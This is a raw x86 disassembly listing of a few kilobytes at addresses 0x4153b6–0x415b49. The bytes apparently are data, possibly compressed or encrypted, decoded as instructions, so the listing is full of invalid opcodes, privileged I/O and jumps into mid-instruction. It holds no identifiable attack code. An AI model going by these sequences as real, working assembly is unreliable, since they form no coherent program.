  4153b6:	out    dx,eax
  4153b7:	sbb    BYTE PTR [ecx],bh
  4153b9:	loope  0x415408
  4153bb:	cli    
  4153bc:	mov    bh,0x72
  4153be:	ret    
  4153bf:	add    ah,al
  4153c1:	fstp   DWORD PTR gs:[eax+eax*1-0x70]
  4153c6:	gs ins BYTE PTR es:[edi],dx
  4153c8:	sbb    esi,DWORD PTR [ebx-0x69]
  4153cb:	(bad)  
  4153cc:	in     eax,0xfd
  4153ce:	inc    edi
  4153cf:	jne    0x4153e2
  4153d1:	xchg   edx,eax
  4153d2:	in     eax,dx
  4153d3:	sbb    BYTE PTR [ebx],ah
  4153d5:	sub    edx,DWORD PTR [ebx-0xa]
  4153d8:	sbb    al,0xec
  4153da:	(bad)  [esi+eiz*4]
  4153dd:	pop    edx
  4153de:	mov    al,ds:0x706e4580
  4153e3:	jl     0x415396
  4153e5:	dec    esi
  4153e6:	fdiv   st,st(5)
  4153e8:	mov    esi,0xcf5c6d90
  4153ed:	aaa    
  4153ee:	scas   eax,DWORD PTR es:[edi]
  4153ef:	dec    esp
  4153f0:	push   di
  4153f2:	gs sub dh,bh
  4153f5:	adc    eax,0xaf51f708
  4153fa:	sbb    eax,0x857a2a99
  4153ff:	push   esi
  415400:	(bad)  
  415401:	imul   ebp,DWORD PTR [eax-0x23],0x31ccc5fc
  415408:	iret   
  415409:	add    DWORD PTR [edx],esi
  41540b:	pop    esp
  41540c:	call   0x5244:0x6f705640
  415413:	rol    BYTE PTR [edi],cl
  415415:	mov    ds:0x1d29eacb,eax
  41541a:	in     al,0x44
  41541c:	stc    
  41541d:	scas   eax,DWORD PTR es:[edi]
  41541e:	jecxz  0x415412
  415420:	push   edx
  415421:	(bad)  [edi-0x70]
  415424:	mov    dl,0x91
  415426:	(bad)  
  415427:	mov    ds:0xc483d20a,eax
  41542c:	lods   eax,DWORD PTR ds:[esi]
  41542d:	gs fs cdq 
  415430:	cmp    bh,0xa8
  415433:	rol    DWORD PTR [ebx+0x1a],1
  415436:	gs loopne 0x4153c7
  415439:	jmp    DWORD PTR [ecx+0x31553643]
  41543f:	mov    ds:0xfbbc83a6,al
  415444:	stos   DWORD PTR es:[edi],eax
  415445:	pop    eax
  415446:	into   
  415447:	shl    BYTE PTR [ebx+eax*8],cl
  41544a:	jecxz  0x41544e
  41544c:	cwde   
  41544d:	mov    al,0x2d
  41544f:	adc    al,0x6b
  415451:	inc    ebx
  415452:	jmp    0x415404
  415454:	inc    edi
  415455:	arpl   WORD PTR [ebx+0x5a],sp
  415458:	mov    edi,0x79ce190f
  41545d:	imul   eax,ecx,0x4c63b22b
  415463:	jmp    0x52593ec2
  415468:	not    esi
  41546a:	repnz icebp 
  41546c:	rol    BYTE PTR [ebx],1
  41546e:	imul   edi,DWORD PTR [eax],0x58
  415471:	sub    DWORD PTR [eax+0x76],0x1a72ac28
  415478:	pop    ebp
  415479:	sbb    dl,al
  41547b:	test   DWORD PTR [eax+0x47c6228e],edi
  415481:	lock dec esp
  415483:	push   es
  415484:	or     DWORD PTR [ebx],0xdbca462b
  41548a:	and    eax,0xeaac7898
  41548f:	inc    edi
  415490:	dec    edx
  415491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415492:	lahf   
  415493:	push   0xffffff8e
  415495:	add    dh,dh
  415497:	loop   0x41542d
  415499:	fmul   DWORD PTR [esi+0x466bd44e]
  41549f:	(bad)  
  4154a0:	call   0xfdb72b92
  4154a5:	test   al,0x63
  4154a7:	ds adc edx,edi
  4154aa:	test   DWORD PTR [eax],ebp
  4154ac:	sbb    DWORD PTR ds:0x5c2e45f2,edi
  4154b2:	cmp    edx,0x3b
  4154b5:	mov    dl,0x26
  4154b7:	push   cs
  4154b8:	arpl   WORD PTR [ecx-0x7d],sp
  4154bb:	mov    bh,0x80
  4154bd:	lock aam 0xd0
  4154c0:	ret    0xe9d1
  4154c3:	lods   eax,DWORD PTR ds:[esi]
  4154c4:	mov    es,WORD PTR [ebp-0x782567c9]
  4154ca:	mov    ds:0x7bcea0c7,eax
  4154cf:	lods   al,BYTE PTR ds:[esi]
  4154d0:	xchg   ebp,eax
  4154d1:	dec    ebp
  4154d2:	xchg   BYTE PTR [ebx],bl
  4154d4:	jne    0x415481
  4154d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154d7:	sbb    BYTE PTR [ebp+0x1f222ff5],0x52
  4154de:	retf   
  4154df:	(bad)  
  4154e0:	cmp    al,0xf9
  4154e2:	mov    esp,0xa8e61ee7
  4154e7:	xor    ebp,DWORD PTR [ecx]
  4154e9:	xor    cl,al
  4154eb:	push   0x51
  4154ed:	mov    ds:0x33d1f2b3,eax
  4154f2:	pop    ss
  4154f3:	dec    edi
  4154f4:	repz stc 
  4154f6:	pcmpgtb mm1,QWORD PTR [edi+0x61e5d843]
  4154fd:	add    BYTE PTR [esi-0x5c8dbc7d],cl
  415503:	dec    ecx
  415504:	retf   
  415505:	xchg   edi,eax
  415506:	jns    0x415491
  415508:	add    DWORD PTR [edx+ebp*8],edx
  41550b:	fsubr  st(1),st
  41550d:	in     al,dx
  41550e:	(bad)  
  41550f:	iret   
  415510:	cs loope 0x415539
  415513:	popf   
  415514:	pop    edx
  415515:	xchg   esi,eax
  415516:	sbb    DWORD PTR [edi-0xa],ebx
  415519:	int3   
  41551a:	mov    esp,0xbd250b67
  41551f:	jg     0x415553
  415521:	lods   eax,DWORD PTR ds:[esi]
  415522:	mul    BYTE PTR [edi+0x509c1624]
  415528:	xchg   esp,eax
  415529:	mov    BYTE PTR [ebx-0x5f29a840],ch
  41552f:	retf   0x6391
  415532:	lods   al,BYTE PTR ds:[esi]
  415533:	gs test eax,0x319a53c4
  415539:	in     eax,0xf2
  41553b:	fnstcw WORD PTR [esi-0x7c]
  41553e:	push   eax
  41553f:	xchg   esp,eax
  415540:	ins    BYTE PTR es:[edi],dx
  415541:	fbld   TBYTE PTR [esi]
  415543:	dec    esi
  415544:	outs   dx,BYTE PTR ds:[esi]
  415545:	dec    ebx
  415546:	int3   
  415547:	dec    ecx
  415548:	nop
  415549:	dec    ecx
  41554a:	lea    ecx,ds:0xd7339430
  415550:	icebp  
  415551:	mov    BYTE PTR [edx],bh
  415553:	pop    es
  415554:	out    0x51,eax
  415556:	dec    esp
  415557:	rcl    ecx,0x82
  41555a:	shr    DWORD PTR [eax+ecx*8+0x8],0x96
  41555f:	xchg   ebp,eax
  415560:	adc    esi,0xffffff9e
  415563:	test   eax,0xd3943780
  415568:	(bad)  
  415569:	ja     0x415568
  41556b:	ret    0xbf5f
  41556e:	ss pop ebx
  415570:	into   
  415571:	xor    DWORD PTR [edi],esi
  415573:	xor    dh,BYTE PTR [ebx+0x14]
  415576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415577:	adc    eax,0x17faa91a
  41557c:	sbb    eax,0x125b43a8
  415581:	shl    DWORD PTR [ecx-0x1142daf5],cl
  415587:	mov    ecx,0xa099c11d
  41558c:	inc    esp
  41558d:	sub    eax,0x67e26b83
  415592:	(bad)  ds:0x5c32a778
  415598:	mov    cl,0x4c
  41559a:	xchg   edi,eax
  41559b:	dec    ebp
  41559c:	repnz mov dl,0xc8
  41559f:	icebp  
  4155a0:	pop    ecx
  4155a1:	je     0x41555b
  4155a3:	jnp    0x415591
  4155a5:	add    DWORD PTR [ecx],ebx
  4155a7:	jmp    0xa7926ee
  4155ac:	adc    ah,BYTE PTR [ebp+0x14]
  4155af:	popa   
  4155b0:	test   DWORD PTR [edx-0x7f3dfee7],ebp
  4155b6:	cmp    eax,DWORD PTR es:[eax-0x73b37fd8]
  4155bd:	jae    0x4155f4
  4155bf:	call   0xaa627600
  4155c4:	mov    ds:0xac0ddb80,eax
  4155c9:	pop    edi
  4155ca:	dec    edx
  4155cb:	and    edx,DWORD PTR [ecx+0x20f26785]
  4155d1:	into   
  4155d2:	or     BYTE PTR [eax],ah
  4155d4:	adc    al,0xa6
  4155d6:	jmp    0x415634
  4155d8:	and    DWORD PTR [ecx+0x76],esi
  4155db:	jle    0x4155bc
  4155dd:	enter  0x6210,0x84
  4155e1:	push   es
  4155e2:	test   DWORD PTR [esi+0x6e],ebp
  4155e5:	cld    
  4155e6:	xchg   ecx,eax
  4155e7:	in     al,dx
  4155e8:	jl     0x415580
  4155ea:	adc    al,0xe1
  4155ec:	mov    eax,ds:0x39825696
  4155f1:	out    0xac,al
  4155f3:	push   ebx
  4155f4:	lods   al,BYTE PTR ds:[esi]
  4155f5:	sbb    ebp,DWORD PTR [edx]
  4155f7:	loop   0x4155f9
  4155f9:	int3   
  4155fa:	das    
  4155fb:	ins    BYTE PTR es:[edi],dx
  4155fc:	sbb    DWORD PTR [edx+eiz*2-0x47],esp
  415600:	push   cs
  415601:	inc    edx
  415602:	xchg   esi,eax
  415603:	fdivr  QWORD PTR [esi+0x7d66c277]
  415609:	xor    dh,dl
  41560b:	mov    dl,0x11
  41560d:	inc    edx
  41560e:	mov    esp,0x17243d8f
  415613:	fadd   QWORD PTR [esi]
  415615:	xchg   edi,eax
  415616:	(bad)  
  415617:	jnp    0x415657
  415619:	aad    0xc2
  41561b:	mov    ebp,0x4270b199
  415620:	cmovns edi,edx
  415623:	cdq    
  415624:	icebp  
  415625:	pop    eax
  415626:	jae    0x4155d2
  415628:	cwde   
  415629:	jp     0x41566e
  41562b:	sub    BYTE PTR ds:0xc2fd187e,ah
  415631:	cs cwde 
  415633:	jae    0x4155e6
  415635:	xchg   ebx,eax
  415636:	cmp    BYTE PTR [eax+0x47628049],bh
  41563c:	dec    esi
  41563d:	dec    eax
  41563e:	add    eax,0x4baa7b7d
  415643:	dec    esi
  415644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415645:	add    al,0xe6
  415647:	pop    ds
  415648:	int    0x3c
  41564a:	or     eax,0xd816c23d
  41564f:	scas   eax,DWORD PTR es:[edi]
  415650:	test   eax,0x553b4cbf
  415655:	adc    bl,al
  415657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415658:	cmp    ebx,edi
  41565a:	aad    0x5c
  41565c:	xchg   ecx,eax
  41565d:	out    dx,eax
  41565e:	in     eax,dx
  41565f:	nop
  415660:	pop    es
  415661:	loope  0x415609
  415663:	outs   dx,DWORD PTR ds:[esi]
  415664:	hlt    
  415665:	icebp  
  415666:	or     eax,0x2e27fb39
  41566b:	mov    ebp,0x771440b
  415670:	out    0xa,al
  415672:	mov    dh,0xda
  415674:	pop    esi
  415675:	mov    dh,0xcb
  415677:	ins    DWORD PTR es:[edi],dx
  415678:	sbb    eax,0x3bd7c23a
  41567d:	int    0xd0
  41567f:	push   DWORD PTR [ebx]
  415681:	jp     0x4156f0
  415683:	mov    BYTE PTR [ebp+0x56],ah
  415686:	inc    ebx
  415687:	(bad)  
  415688:	sbb    bh,BYTE PTR [ebp-0x12b62461]
  41568e:	jo     0x4156a2
  415690:	pop    ss
  415691:	fld1   
  415693:	rcl    BYTE PTR [edi+eiz*4-0x30],cl
  415697:	fxch   st(0)
  415699:	dec    ebx
  41569a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41569b:	fld    QWORD PTR [edx-0x8]
  41569e:	icebp  
  41569f:	push   cs
  4156a0:	sbb    DWORD PTR [ebx-0x30039077],esi
  4156a6:	adc    eax,0xec6ec298
  4156ab:	imul   edx,edx,0x94a614cb
  4156b1:	push   edi
  4156b2:	ins    DWORD PTR es:[edi],dx
  4156b3:	(bad)  
  4156b4:	cwde   
  4156b5:	test   al,0xe
  4156b7:	adc    al,0x88
  4156b9:	push   eax
  4156ba:	inc    edi
  4156bb:	pop    eax
  4156bc:	add    cl,al
  4156be:	mov    ecx,0x2bae50c6
  4156c3:	pop    ebp
  4156c4:	leave  
  4156c5:	popa   
  4156c6:	jo     0x41572b
  4156c8:	pusha  
  4156c9:	cmc    
  4156ca:	inc    esi
  4156cb:	mov    al,ds:0xac7a560e
  4156d0:	inc    ebx
  4156d1:	sbb    eax,0x7949ae8
  4156d7:	cmc    
  4156d8:	sub    DWORD PTR [ebx-0x7a],0x1da1a305
  4156df:	repnz icebp 
  4156e1:	jmp    0x415752
  4156e3:	mov    BYTE PTR [esi],ch
  4156e5:	sti    
  4156e6:	sbb    BYTE PTR [ebp-0x3d],0xc6
  4156ea:	dec    esi
  4156eb:	pop    ecx
  4156ec:	in     al,0xe1
  4156ee:	mov    ds:0x45a25f89,al
  4156f3:	push   edi
  4156f4:	scas   eax,DWORD PTR es:[edi]
  4156f5:	adc    al,0x9
  4156f7:	popa   
  4156f8:	enter  0x4504,0xe3
  4156fc:	mov    BYTE PTR [eax+0x59],cl
  4156ff:	cmp    DWORD PTR [esi-0x16],esp
  415702:	xchg   DWORD PTR [ebx],eax
  415704:	dec    esp
  415705:	ret    
  415706:	inc    esi
  415707:	and    BYTE PTR ds:0xd047f909,0xda
  41570e:	shl    DWORD PTR [edi-0x45],cl
  415711:	sub    al,0xcb
  415713:	fs cdq 
  415715:	jl     0x4156ff
  415717:	shr    ebp,cl
  415719:	xor    al,0x99
  41571b:	pop    ebx
  41571c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41571d:	(bad)  
  41571e:	test   cl,0xf3
  415721:	pop    es
  415722:	stos   BYTE PTR es:[edi],al
  415723:	inc    eax
  415724:	aas    
  415725:	add    ebp,esi
  415727:	dec    ebx
  415728:	stc    
  415729:	dec    esp
  41572a:	int3   
  41572b:	adc    eax,0x9ca3b112
  415730:	cmp    ebx,DWORD PTR [esi-0x4ae9efb1]
  415736:	xlat   BYTE PTR ds:[ebx]
  415737:	mov    eax,0x2abe7bfe
  41573c:	scas   eax,DWORD PTR es:[edi]
  41573d:	(bad)  
  41573e:	(bad)  
  415740:	inc    edi
  415741:	adc    cl,bh
  415743:	adc    ah,ah
  415745:	or     eax,0x1f6aeaac
  41574a:	mov    eax,0xf9f711d6
  41574f:	lea    eax,ss:[ecx+0x1805107c]
  415756:	jno    0x41576b
  415758:	sub    DWORD PTR ds:0x733c0197,0xf
  41575f:	push   ss
  415760:	sbb    BYTE PTR [esi],dh
  415762:	les    ebx,FWORD PTR [ebx]
  415764:	or     ch,bh
  415766:	scas   al,BYTE PTR es:[edi]
  415767:	pop    eax
  415768:	loop   0x415763
  41576a:	retf   0x1920
  41576d:	or     al,0xef
  41576f:	jae    0x415765
  415771:	popf   
  415772:	add    eax,0xf5775acf
  415777:	sub    eax,0x6e31daee
  41577c:	push   es
  41577d:	inc    ebp
  41577e:	in     al,0x64
  415780:	mov    dh,0xfd
  415782:	or     bh,ch
  415784:	lods   eax,DWORD PTR ds:[esi]
  415785:	inc    edi
  415786:	cld    
  415787:	or     dl,bh
  415789:	push   cs
  41578a:	popfw  
  41578c:	mov    al,ds:0xe79e016e
  415791:	mov    edx,0x33165644
  415796:	sub    cl,cl
  415798:	jle    0x4157ce
  41579a:	shr    DWORD PTR [ebp+0x7c8181dc],1
  4157a0:	fs lds eax,FWORD PTR gs:[esi-0xd76864b]
  4157a8:	mov    ebp,0xbedcd020
  4157ad:	sub    al,ah
  4157af:	xchg   ebp,eax
  4157b0:	dec    ecx
  4157b1:	push   ebp
  4157b2:	cdq    
  4157b3:	ja     0x41577b
  4157b5:	retf   0xe7e1
  4157b8:	dec    esp
  4157b9:	xchg   ebx,eax
  4157ba:	aas    
  4157bb:	add    ebx,DWORD PTR [eax-0x5e344979]
  4157c1:	xor    ch,BYTE PTR [ebp+ebp*4+0xa]
  4157c5:	mov    eax,ds:0x398e1859
  4157ca:	push   es
  4157cb:	sbb    ebp,DWORD PTR [ebx+eax*8-0x2e]
  4157cf:	mov    esp,0x8f2896c8
  4157d4:	call   0xf1a4:0xaf65b5de
  4157db:	ror    BYTE PTR [ebx+ebx*8-0x48518c8a],1
  4157e2:	sub    DWORD PTR [esi],esp
  4157e4:	fs jne 0x4157c6
  4157e7:	sbb    ebp,0xd213afbe
  4157ed:	sbb    eax,DWORD PTR [edx-0x12]
  4157f0:	jbe    0x415853
  4157f2:	fsubr  st(1),st
  4157f4:	xchg   edi,eax
  4157f5:	mov    esp,0x39723333
  4157fa:	fdivr  QWORD PTR [edi-0x27]
  4157fd:	pop    ebx
  4157fe:	xchg   ebx,eax
  4157ff:	jge    0x41583d
  415801:	add    BYTE PTR [eax-0x60bc8b95],bh
  415807:	sbb    bl,BYTE PTR [edi+0x34ced15c]
  41580d:	cmp    ecx,DWORD PTR [edi-0x48]
  415810:	lahf   
  415811:	pusha  
  415812:	adc    edi,eax
  415814:	(bad)  
  415815:	xchg   esp,eax
  415816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415817:	mov    al,0x15
  415819:	or     ebp,DWORD PTR [eax-0x5e]
  41581c:	rcr    ecx,1
  41581e:	cmp    al,0xa1
  415820:	cmc    
  415821:	imul   ecx,DWORD PTR [ebp+esi*8-0x13e64cc],0xec01854c
  41582c:	lds    edx,FWORD PTR [esi+0x57a66b6c]
  415832:	in     al,dx
  415833:	add    al,0x47
  415835:	outs   dx,DWORD PTR ds:[esi]
  415836:	mov    dh,0x12
  415838:	outs   dx,BYTE PTR ds:[esi]
  415839:	mov    eax,ds:0xd691c591
  41583e:	sbb    al,0xa5
  415840:	xor    eax,DWORD PTR [ebx-0x21]
  415843:	xchg   esi,eax
  415844:	ret    
  415845:	stos   DWORD PTR es:[edi],eax
  415846:	mov    ds:0x9b207823,al
  41584b:	push   ecx
  41584c:	lods   eax,DWORD PTR ds:[esi]
  41584d:	test   ah,al
  41584f:	(bad)  
  415850:	dec    esp
  415851:	rol    al,cl
  415853:	into   
  415854:	mov    ebp,ebp
  415856:	clc    
  415857:	addr16 nop
  415859:	xchg   BYTE PTR [ecx],cl
  41585b:	and    BYTE PTR [ebp+0x75],bh
  41585e:	lods   al,BYTE PTR ds:[esi]
  41585f:	push   0x55
  415861:	fs xchg esp,eax
  415863:	push   ebx
  415864:	inc    ebx
  415865:	inc    eax
  415866:	pop    ss
  415867:	gs dec esi
  415869:	push   ecx
  41586a:	xor    DWORD PTR [edi+0x7549e0c2],edi
  415870:	mov    esi,0xa7bf1735
  415875:	mov    bh,0x81
  415877:	jbe    0x4158a0
  415879:	sahf   
  41587a:	mov    al,0xa5
  41587c:	repz inc ebp
  41587e:	pop    edi
  41587f:	out    0x94,al
  415881:	sbb    dh,BYTE PTR [eax+0xe]
  415884:	mov    dh,0x66
  415886:	(bad)  
  415887:	mov    eax,DWORD PTR ds:0x64b3926f
  41588d:	cmp    BYTE PTR ds:0x3ffad11c,dl
  415893:	jbe    0x41584e
  415895:	cmp    ah,cl
  415897:	or     eax,0xf41d8283
  41589c:	int3   
  41589d:	dec    edx
  41589e:	test   BYTE PTR [esi],dh
  4158a0:	cmc    
  4158a1:	mov    ecx,0x15411f7c
  4158a6:	enter  0x2051,0xfa
  4158aa:	test   eax,0x2c01e028
  4158af:	hlt    
  4158b0:	loope  0x415832
  4158b2:	popa   
  4158b3:	stos   BYTE PTR es:[edi],al
  4158b4:	push   esp
  4158b5:	push   ds
  4158b6:	cmp    edi,ecx
  4158b8:	xchg   ebx,eax
  4158b9:	mov    esp,0xd948821d
  4158be:	aad    0x96
  4158c0:	add    BYTE PTR [eax+0x4c5eb47],bl
  4158c6:	sbb    BYTE PTR [esi-0x2479d79a],al
  4158cc:	xchg   edi,eax
  4158cd:	in     al,dx
  4158ce:	ror    esp,cl
  4158d0:	lea    edx,[ebx]
  4158d2:	scas   eax,DWORD PTR es:[edi]
  4158d3:	inc    ecx
  4158d4:	daa    
  4158d5:	ins    BYTE PTR es:[edi],dx
  4158d6:	call   0x2529201e
  4158db:	dec    ecx
  4158dc:	adc    ebp,DWORD PTR [ebx+0x47]
  4158df:	adc    al,0x52
  4158e1:	mov    al,ds:0x66767a73
  4158e6:	adc    esi,DWORD PTR [ebx]
  4158e8:	ins    BYTE PTR es:[edi],dx
  4158e9:	sub    eax,0xf42ce136
  4158ee:	int    0x3f
  4158f0:	xchg   esp,eax
  4158f1:	add    ecx,DWORD PTR [edi+ebp*8-0x77]
  4158f5:	out    dx,eax
  4158f6:	sbb    edi,esi
  4158f8:	aas    
  4158f9:	adc    dh,cl
  4158fb:	dec    esp
  4158fc:	dec    esi
  4158fd:	in     eax,dx
  4158fe:	xchg   esi,eax
  4158ff:	sbb    al,0xa7
  415901:	js     0x415941
  415903:	mov    ecx,0xb188383f
  415908:	sbb    cl,al
  41590a:	cdq    
  41590b:	fsub   QWORD PTR [ebp+0x2b]
  41590e:	mov    ch,0x3d
  415910:	test   ebx,esp
  415912:	daa    
  415913:	lea    eax,[ebp-0x24e50887]
  415919:	das    
  41591a:	cdq    
  41591b:	cdq    
  41591c:	and    BYTE PTR [ebx+0x37],bh
  41591f:	out    0xf3,eax
  415921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415922:	jl     0x4159a2
  415924:	mov    cl,0x1a
  415926:	mov    al,BYTE PTR [ebx+0x29]
  415929:	aas    
  41592a:	ins    DWORD PTR es:[edi],dx
  41592b:	dec    BYTE PTR [ecx]
  41592d:	fimul  DWORD PTR [eax+0x3fbb73be]
  415933:	mov    gs,WORD PTR [edx+0x50]
  415936:	jno    0x415957
  415938:	pushf  
  415939:	jae    0x415941
  41593b:	mov    edi,0xee20e411
  415940:	les    edi,FWORD PTR [edx+0x5]
  415943:	xor    DWORD PTR [ebp+0x131c7a55],0x34
  41594a:	push   ebx
  41594b:	jne    0x4159b8
  41594d:	xor    dl,BYTE PTR [ecx]
  41594f:	in     al,0xfe
  415951:	or     esp,ecx
  415953:	inc    esp
  415954:	popf   
  415955:	stos   BYTE PTR es:[edi],al
  415956:	cmp    bh,BYTE PTR [ecx-0x51]
  415959:	aas    
  41595a:	lods   eax,DWORD PTR ds:[esi]
  41595b:	popa   
  41595c:	pop    edx
  41595d:	mov    eax,ds:0x57954920
  415962:	mov    edi,0xccf3fb68
  415967:	pop    ss
  415968:	ins    DWORD PTR es:[edi],dx
  415969:	into   
  41596a:	daa    
  41596b:	or     eax,0x5be72b6d
  415970:	pop    es
  415971:	stos   BYTE PTR es:[edi],al
  415972:	jmp    0x415974
  415974:	pop    ss
  415975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415976:	push   ecx
  415977:	fcomp  QWORD PTR [ecx]
  415979:	and    BYTE PTR [ebp+0x38],0x0
  41597d:	pop    eax
  41597e:	jae    0x4159be
  415980:	rol    BYTE PTR [edi+0x4f],1
  415983:	xor    bl,BYTE PTR [ebp+ebp*8-0x31]
  415987:	or     esi,DWORD PTR [ebx+0x33]
  41598a:	sub    BYTE PTR [esi],0x4c
  41598d:	xor    DWORD PTR [edx-0x74],esi
  415990:	stos   BYTE PTR es:[edi],al
  415991:	(bad)  
  415992:	xor    eax,0x4d4ad667
  415997:	xor    al,0x44
  415999:	push   ds
  41599a:	leave  
  41599b:	dec    ebp
  41599c:	out    0xa3,al
  41599e:	cmp    eax,0xb1d2cdf8
  4159a3:	push   edi
  4159a4:	(bad)  
  4159a5:	push   es
  4159a6:	pop    ebx
  4159a7:	xchg   ebp,eax
  4159a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159a9:	frstor ds:0x9d87ae4d
  4159af:	push   ecx
  4159b0:	das    
  4159b1:	outs   dx,DWORD PTR ds:[esi]
  4159b2:	sub    BYTE PTR fs:[esi+edx*8+0x16],0x99
  4159b8:	loope  0x4159ce
  4159ba:	repnz inc ebp
  4159bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159bd:	int    0x77
  4159bf:	mov    ds:0xaa63f6bf,al
  4159c4:	jle    0x415a0e
  4159c6:	mov    ebp,0x378c3f9e
  4159cb:	repnz mov cs,WORD PTR [edi+0x613ec0db]
  4159d2:	inc    edx
  4159d3:	cs sbb eax,0x4ed5c2a7
  4159d9:	xor    al,0xf
  4159db:	iret   
  4159dc:	retf   
  4159dd:	hlt    
  4159de:	jmp    FWORD PTR [edx+0x17]
  4159e1:	and    DWORD PTR [eax+0x37d87d8a],edi
  4159e7:	les    esi,FWORD PTR [esi-0x34fd0def]
  4159ed:	xchg   DWORD PTR [edx-0x3d],edx
  4159f0:	cs jmp 0x26548e5b
  4159f6:	cdq    
  4159f7:	rol    DWORD PTR [esi],0x1e
  4159fa:	xor    eax,ebp
  4159fc:	stc    
  4159fd:	add    BYTE PTR [ebx+esi*2+0x70],al
  415a01:	fimul  DWORD PTR [edi-0x29]
  415a04:	lods   al,BYTE PTR ds:[esi]
  415a05:	jne    0x415a0a
  415a07:	xchg   ecx,eax
  415a08:	jecxz  0x415a33
  415a0a:	mov    eax,0xc71bcd27
  415a0f:	adc    eax,0x13e858fb
  415a14:	pop    ebp
  415a15:	lods   al,BYTE PTR ds:[esi]
  415a16:	cli    
  415a17:	xor    al,0xfd
  415a19:	aaa    
  415a1a:	mov    esi,0xb8b1d6bf
  415a1f:	test   BYTE PTR [ecx+0x439f793a],cl
  415a25:	(bad)
  415a29:	sbb    DWORD PTR [eax+0x2e],edx
  415a2c:	xchg   ebp,eax
  415a2d:	sbb    DWORD PTR [edx],ebp
  415a2f:	push   0xffffffaf
  415a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a32:	cwde   
  415a33:	inc    esp
  415a34:	push   0x976be01a
  415a39:	push   eax
  415a3a:	sbb    edi,DWORD PTR [edi]
  415a3c:	in     al,0x67
  415a3e:	hlt    
  415a3f:	pop    edi
  415a40:	sar    dl,0xbd
  415a43:	jg     0x415aaa
  415a45:	nop
  415a46:	or     DWORD PTR [edx-0x12],ecx
  415a49:	add    BYTE PTR [ebx],ah
  415a4b:	jge    0x415abe
  415a4d:	xchg   ebx,eax
  415a4e:	inc    edi
  415a4f:	outs   dx,DWORD PTR ds:[esi]
  415a50:	mov    ah,cl
  415a52:	jle    0x415a4e
  415a54:	in     al,0x20
  415a56:	jp     0x415a20
  415a58:	and    al,0xa6
  415a5a:	mov    eax,0xbac24090
  415a5f:	loop   0x4159e9
  415a61:	out    0x6,al
  415a63:	xchg   esp,eax
  415a64:	cli    
  415a65:	div    BYTE PTR [ecx+0x68]
  415a68:	dec    ebx
  415a69:	out    0x90,eax
  415a6b:	fcmovnu st,st(4)
  415a6d:	dec    esi
  415a6e:	push   ss
  415a6f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  415a71:	les    edi,FWORD PTR [edi+0x24955940]
  415a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a78:	sbb    al,0x76
  415a7a:	icebp  
  415a7b:	push   es
  415a7c:	aad    0xb6
  415a7e:	retf   
  415a7f:	stc    
  415a80:	out    dx,eax
  415a81:	ins    BYTE PTR es:[edi],dx
  415a82:	and    esi,DWORD PTR [edi-0xb]
  415a85:	pop    esp
  415a86:	addr16 into 
  415a88:	dec    ebp
  415a89:	pop    ecx
  415a8a:	fst    DWORD PTR [ebx]
  415a8c:	cmp    BYTE PTR [ebx],dh
  415a8e:	mov    al,ds:0x2552e22
  415a93:	cmp    DWORD PTR [ebx-0x5d],edi
  415a96:	imul   eax,DWORD PTR [ebx-0x18],0xffffffd6
  415a9a:	mov    dl,0xf2
  415a9c:	xor    BYTE PTR [ecx-0x475d0319],bh
  415aa2:	scas   eax,DWORD PTR es:[edi]
  415aa3:	lds    ebx,FWORD PTR [ebp-0x541dd548]
  415aa9:	sub    DWORD PTR [edx],esp
  415aab:	mov    bh,0x52
  415aad:	xchg   esi,eax
  415aae:	xor    dl,BYTE PTR [ebx]
  415ab0:	dec    eax
  415ab1:	bound  ebx,QWORD PTR [ecx+0x51153944]
  415ab7:	retf   0xc9b2
  415aba:	mov    ebp,0x9503840b
  415abf:	add    ch,BYTE PTR [esi]
  415ac1:	and    DWORD PTR [esi-0x53d5fc64],esi
  415ac7:	(bad)  
  415ac8:	imul   esp,edx,0x68
  415acb:	jns    0x415b3a
  415acd:	mov    dl,dh
  415acf:	add    ah,dl
  415ad1:	sub    al,0x2
  415ad3:	or     BYTE PTR [esi+0x29328837],dh
  415ad9:	fmul   st(6),st
  415adb:	mov    edx,DWORD PTR [ebx-0x54]
  415ade:	test   al,0x8c
  415ae0:	mov    ah,0x58
  415ae2:	mov    eax,ds:0x13b849f
  415ae7:	pop    esp
  415ae8:	dec    edx
  415ae9:	in     eax,dx
  415aea:	aam    0xd6
  415aec:	das    
  415aed:	mov    esi,DWORD PTR [esi+eax*4+0x75]
  415af1:	(bad)
  415af5:	cmp    ebp,DWORD PTR [edx+0x1c14e4b1]
  415afb:	dec    edi
  415afc:	add    DWORD PTR [ebp+esi*4+0x20],eax
  415b00:	stos   BYTE PTR es:[edi],al
  415b01:	fcomp  st(1)
  415b03:	cmp    eax,DWORD PTR [ebp+0xfccf742]
  415b09:	fxch   st(5)
  415b0b:	inc    esi
  415b0c:	mov    ds:0x4a89ba7,al
  415b11:	div    ebx
  415b13:	push   ds
  415b14:	jg     0x415b56
  415b16:	mov    ch,0x19
  415b18:	jno    0x415b3c
  415b1a:	in     eax,dx
  415b1b:	lock sub ebx,ebp
  415b1e:	pop    edi
  415b1f:	test   BYTE PTR [ecx],ah
  415b21:	pop    ebx
  415b22:	dec    ebp
  415b23:	fcomp  QWORD PTR [edi-0x6b]
  415b26:	(bad)  
  415b27:	push   esp
  415b28:	into   
  415b29:	cwde   
  415b2a:	mov    WORD PTR [ebp-0x61],fs
  415b2d:	adc    DWORD PTR ds:0xfb2129c1,0x31
  415b34:	repz sub ah,BYTE PTR [edi]
  415b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b38:	sbb    BYTE PTR ds:0xadf32a38,0x4c
  415b3f:	(bad)
  415b44:	and    eax,0x3ae5fd49
  415b49:	xor    al,0x4f
